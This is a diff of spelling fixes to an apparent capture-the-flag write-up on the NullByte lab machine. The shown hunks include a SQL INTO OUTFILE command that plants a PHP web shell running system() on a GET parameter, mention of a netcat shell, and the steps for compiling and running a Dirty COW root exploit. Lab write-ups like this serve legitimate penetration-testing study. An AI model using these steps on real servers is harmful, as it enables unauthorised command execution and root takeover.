@@ -394,7 +394,7 @@ Why won't you just work!  Ugh!  Time to actually read the eror message... looks 
 
 ![nullbytehome](/images/nb9.png)
 
-I must not have wrote permission to /var/www/phpmyadmin or /var/www.  But hey, I already have user from SSH.  I'll navigate from that shell and see what the permissions are:
+I must not have write permission to /var/www/phpmyadmin or /var/www.  But hey, I already have user from SSH.  I'll navigate from that shell and see what the permissions are:
 
 ```
 ramses@NullByte:~$ ls -al /var/www/
@@ -416,7 +416,7 @@ drwxrwxrwx 2 root root  4096 Aug  2  2015 uploads
 
 Spankowitz, you dummy.  You blindly copied a shell from Github and didn't look at where it was trying to place it!  The error was telling you that the directory didn't exist, not that you didn't have permission.  Let's modify our little SQL command:
 
->>SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
+>SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
 INTO OUTFILE ‘/var/www/html/uploads/cmd.php’
 
 ![nullbytehome](/images/nb10.png)
@@ -485,7 +485,7 @@ lrwxrwxrwx 1 root root        9 Mar 17  2015 /usr/bin/python -> python2.7
 
 Note that the architecture is i686.  More on that in a bit.  Every user's home directory is readable, Python permissions are pretty lax.  We've got GCC installed.  Interesting that a compiler is installed.  Now I am no priv esc expert.  I'm building a cheat sheet for OSCP.  But I got nothing after looking at the above.  No interesting cron job, no weird files in the user's home directories, no odd binary running.  Oh and fail2ban was running, so SSH bruteforcing would not have worked!
 
-I'm out of ideas, so let's run another script: ![Linux Exploit Suggester](https://github.com/jondonas/linux-exploit-suggester-2)  I copy the file over to the victim, add execute permission and let it go:
+I'm out of ideas, so let's run another script: [Linux Exploit Suggester](https://github.com/jondonas/linux-exploit-suggester-2)  I copy the file over to the victim, add execute permission and run it:
 
 ```
 ./les2.pl
@@ -509,9 +509,9 @@ I'm out of ideas, so let's run another script: ![Linux Exploit Suggester](https:
       Source: http://www.exploit-db.com/exploits/39230
 ```
 
-That was quick.  That's all?  I guess we'll try the first one.  I read the exploit.  Interesting.  It replaces /usr/bin/passwd with a payload, escalating your shell to root.  The author is nice and makes a backup of the really passwd for you so you don't completely brick the box.  It's written in C so we'll have to compile it.  Wait, didn't this box have GCC?  Sweet!
+That was quick.  That's all?  I guess we'll try the first one.  I read the exploit.  Interesting.  It replaces /usr/bin/passwd (how you change your password in 'nix) with a payload, escalating your shell to root.  The eexploit author is nice and makes a backup of /usr/bin/passwd for you so you don't break the box.  It's written in C so we'll have to compile it.  Wait, didn't this box have GCC?  Sweet!
 
-Even though the box has GCC, I decide to compile it myself.  I copy the exploit to my attacker box and rerear the code.  I need to uncomment the correct payload (x86 or x64). I search the old interwebs and i686 is 32 bit, so we need the x86 payload.  Comment out the 64 bit and uncomment the 32 bit.  Ohhh we're gonna pwn root!
+Even though the box has GCC, I decide to compile it myself.  I copy the exploit to my attacker box and reread the code.  I need to uncomment the correct payload (x86 or x64). I search the old interwebs and i686 is 32 bit, so we need the x86 payload.  Comment out the 64 bit and uncomment the 32 bit.  Ohhh we're gonna pwn root!
 
 I follow the command in the exploit and compile the code.  Then I transfer it to the victim (python web server).  I run the code, and nothing.  What?  Stupid Linux Explit Suggester.  I have a crappy netcat shell so I spawn a better shell to see if there are any errors (we saw python in linenum, so I used the python shell upgrade):
 
@@ -521,14 +521,14 @@ Ok... let's see the error.
 
 >bash: ./cowroot: cannot execute binary file: Exec format error
 
-Huh?  Why not!  I complied you, run dammit!  Time to search the interwebs for this error.  Quickly I discover it's a file and host architecture mismatch.  LEt's doubel check the file:
+Huh?  Why not!  I compiled you, run dammit!  Time to search the interwebs for this error.  Quickly I discover it's a file and host architecture mismatch.  Let's double check the file:
 
 ```
 file cowroot
 cowroot: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aec4f878e26d93014e1c5c9ab60160916ef07dd5, for GNU/Linux 3.2.0, not stripped
 ```
 
-64 bit?  The victim is 32 bit!  Why would you do that?!?!?  Whoever compiled this is in idiot!  Oh wait.  I compiled it.  Now, let me give a quick explanation.  As a blue teamer, I know the more a bad guy does on a system, the more chances I have to catch them.  In general, I try to do the most work on my attacker machine.  In this case, I compiled the file on my 64 bit VM, so GCC compiled it for my architecture.  Duh!  Now let's try again but specify 32 bit:
+64 bit?  The victim is 32 bit!  Why would you do that?!?!?  Whoever compiled this is in idiot!  Oh wait.  I compiled it.  Now, let me give a quick explanation.  As a blue teamer, I know the more a bad guy does on a system, the more chances I have to catch them.  So in general, I try to do the most work on my attacker machine that I can.  In this case, I compiled the file on my 64 bit VM, so GCC compiled it for my architecture.  Duh!  Now let's try again but specify 32 bit:
 
 >gcc -m32 40616.c -o cowroot32 -pthread
 
